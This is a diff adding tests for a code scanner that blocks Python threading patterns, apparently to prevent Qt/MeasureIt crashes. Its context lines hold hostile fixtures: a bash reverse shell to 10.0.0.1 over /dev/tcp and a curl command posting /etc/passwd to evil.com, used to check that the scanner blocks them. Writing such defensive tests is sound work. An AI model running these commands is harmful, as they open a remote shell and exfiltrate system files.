@@ -310,3 +310,156 @@ bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
         code = "!curl -X POST -d @/etc/passwd https://evil.com/steal"
         result = scan_code(code)
         assert result.blocked is True
+
+
+class TestThreadingVisitor:
+    """Tests for threading.Thread detection (Qt/MeasureIt crash prevention)."""
+
+    def test_blocks_threading_thread_direct(self):
+        """Test blocking of threading.Thread() instantiation."""
+        code = """
+import threading
+t = threading.Thread(target=sweep.start)
+t.start()
+"""
+        result = scan_code(code)
+        assert result.blocked is True
+        assert any("THREAD" in i.rule_id for i in result.issues)
+
+    def test_blocks_threading_thread_from_import(self):
+        """Test blocking of Thread imported from threading."""
+        code = """
+from threading import Thread
+t = Thread(target=sweep.start)
+t.start()
+"""
+        result = scan_code(code)
+        assert result.blocked is True
+        assert any("THREAD" in i.rule_id for i in result.issues)
+
+    def test_blocks_threading_import_warning(self):
+        """Test warning on threading module import."""
+        code = "import threading"
+        result = scan_code(code)
+        # Import alone is HIGH risk (warning), not CRITICAL (blocked by default)
+        assert any("THREAD002" in i.rule_id for i in result.issues)
+        # With default settings (block_high_risk=True), this should be blocked
+        assert result.blocked is True
+
+    def test_blocks_thread_from_threading_import(self):
+        """Test warning on from threading import Thread."""
+        code = "from threading import Thread"
+        result = scan_code(code)
+        assert any("THREAD003" in i.rule_id for i in result.issues)
+        assert result.blocked is True
+
+    def test_blocks_aliased_threading(self):
+        """Test blocking of aliased threading.Thread."""
+        code = """
+import threading as th
+t = th.Thread(target=func)
+"""
+        result = scan_code(code)
+        assert result.blocked is True
+        assert any("THREAD" in i.rule_id for i in result.issues)
+
+    def test_suggestion_mentions_measureit(self):
+        """Test that blocking message mentions MeasureIt and correct usage."""
+        code = """
+import threading
+t = threading.Thread(target=sweep.start)
+"""
+        result = scan_code(code)
+        # Check that at least one issue mentions MeasureIt and the correct pattern
+        suggestions = [i.suggestion for i in result.issues]
+        assert any("MeasureIt" in s for s in suggestions)
+        assert any("non-blocking" in s for s in suggestions)
+
+    def test_blocks_threading_timer(self):
+        """Test blocking of threading.Timer() - inherits from Thread."""
+        code = """
+import threading
+timer = threading.Timer(1.0, sweep.start)
+timer.start()
+"""
+        result = scan_code(code)
+        assert result.blocked is True
+        assert any("THREAD" in i.rule_id for i in result.issues)
+
+    def test_blocks_timer_from_import(self):
+        """Test blocking of Timer imported from threading."""
+        code = """
+from threading import Timer
+timer = Timer(1.0, func)
+"""
+        result = scan_code(code)
+        assert result.blocked is True
+        assert any("THREAD" in i.rule_id for i in result.issues)
+
+    def test_blocks_threadpoolexecutor(self):
+        """Test blocking of ThreadPoolExecutor - also creates threads."""
+        code = """
+from concurrent.futures import ThreadPoolExecutor
+executor = ThreadPoolExecutor(max_workers=2)
+"""
+        result = scan_code(code)
+        assert result.blocked is True
+        assert any("THREAD" in i.rule_id for i in result.issues)
+
+    def test_blocks_threadpoolexecutor_direct(self):
+        """Test blocking of concurrent.futures.ThreadPoolExecutor()."""
+        code = """
+import concurrent.futures
+executor = concurrent.futures.ThreadPoolExecutor()
+"""
+        result = scan_code(code)
+        assert result.blocked is True
+        assert any("THREAD004" in i.rule_id for i in result.issues)
+
+    def test_allows_processpool_executor(self):
+        """Test that ProcessPoolExecutor is not blocked (different issue)."""
+        code = """
+from concurrent.futures import ProcessPoolExecutor
+executor = ProcessPoolExecutor(max_workers=2)
+"""
+        result = scan_code(code)
+        # ProcessPoolExecutor should not trigger threading visitor
+        assert not any("THREAD" in i.rule_id for i in result.issues)
+
+    def test_blocks_aliased_concurrent_futures(self):
+        """Test blocking of aliased concurrent.futures module."""
+        code = """
+import concurrent.futures as cf
+executor = cf.ThreadPoolExecutor()
+"""
+        result = scan_code(code)
+        assert result.blocked is True
+        assert any("THREAD" in i.rule_id for i in result.issues)
+
+    def test_blocks_star_import_threading(self):
+        """Test blocking of star import from threading."""
+        code = "from threading import *"
+        result = scan_code(code)
+        assert result.blocked is True
+        assert any("THREAD007" in i.rule_id for i in result.issues)
+
+    def test_blocks_star_import_concurrent_futures(self):
+        """Test blocking of star import from concurrent.futures."""
+        code = "from concurrent.futures import *"
+        result = scan_code(code)
+        assert result.blocked is True
+        assert any("THREAD008" in i.rule_id for i in result.issues)
+
+    def test_blocks_import_concurrent_futures(self):
+        """Test warning on import concurrent.futures."""
+        code = "import concurrent.futures"
+        result = scan_code(code)
+        assert result.blocked is True
+        assert any("THREAD006" in i.rule_id for i in result.issues)
+
+    def test_blocks_import_concurrent(self):
+        """Test warning on import concurrent."""
+        code = "import concurrent"
+        result = scan_code(code)
+        assert result.blocked is True
+        assert any("THREAD006" in i.rule_id for i in result.issues)
